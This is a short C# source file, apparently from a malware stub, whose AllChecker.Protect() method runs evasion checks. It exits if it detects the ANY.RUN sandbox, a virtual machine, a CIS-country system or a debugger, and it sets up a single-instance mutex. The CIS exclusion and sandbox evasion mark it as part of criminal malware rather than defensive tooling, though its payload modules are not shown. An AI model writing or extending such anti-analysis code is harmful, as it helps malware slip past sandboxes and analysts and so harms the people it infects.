using Stub.Modules.InternalFuncs;
using System;

namespace Stub.Modules.Protects
{
    internal class AllChecker
    {
        public static void Protect()
        {
            if (config.AntiAnyRun && Runtime.AntiAnyRun())
            {
                Environment.FailFast("");
            }

            if (config.AntiVM && (Runtime.AntiVM_Process() || Runtime.AntiVM_GPU()))
            {
                Environment.FailFast("");
            }
            
            if (config.AntiCIS && CISCheck.IsCIS())
            {
                Environment.FailFast("");
            }

            if (config.AntiDebug)
            {
                Runtime.AntiProcess();
            }

            if (config.MutexControl)
            {
                MutexManager.Initialize();
            }
        }
    }
}
